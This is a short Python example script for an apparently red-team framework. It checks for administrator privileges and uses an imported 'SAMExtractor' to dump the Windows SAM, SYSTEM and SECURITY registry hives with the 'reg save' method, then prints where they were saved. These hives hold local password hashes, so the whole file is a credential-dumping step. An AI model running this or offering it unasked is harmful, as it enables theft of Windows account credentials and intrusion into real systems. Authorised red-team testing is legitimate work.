#!/usr/bin/env python3
"""
Example: Basic SAM/SYSTEM Extraction
Demonstrates simple usage of the framework
"""

from rt_sam_extractor import SAMExtractor

def main():
    """Basic extraction example"""
    print("[*] Example: Basic SAM/SYSTEM Extraction")
    print("="*60)
    
    # Initialize framework
    extractor = SAMExtractor(output_dir="example_dumps")
    
    # Check privileges
    if not extractor.check_privileges():
        print("[!] This example requires administrator privileges")
        return 1
    
    # Execute extraction using reg save method
    print("\n[*] Extracting registry hives using reg save...")
    result = extractor.extract(method='reg_save')
    
    if result:
        print(f"\n[+] Extraction successful!")
        print(f"[+] SAM: {result['sam']}")
        print(f"[+] SYSTEM: {result['system']}")
        
        if 'security' in result:
            print(f"[+] SECURITY: {result['security']}")
        
        return 0
    else:
        print("\n[-] Extraction failed")
        return 1


if __name__ == '__main__':
    import sys
    sys.exit(main())
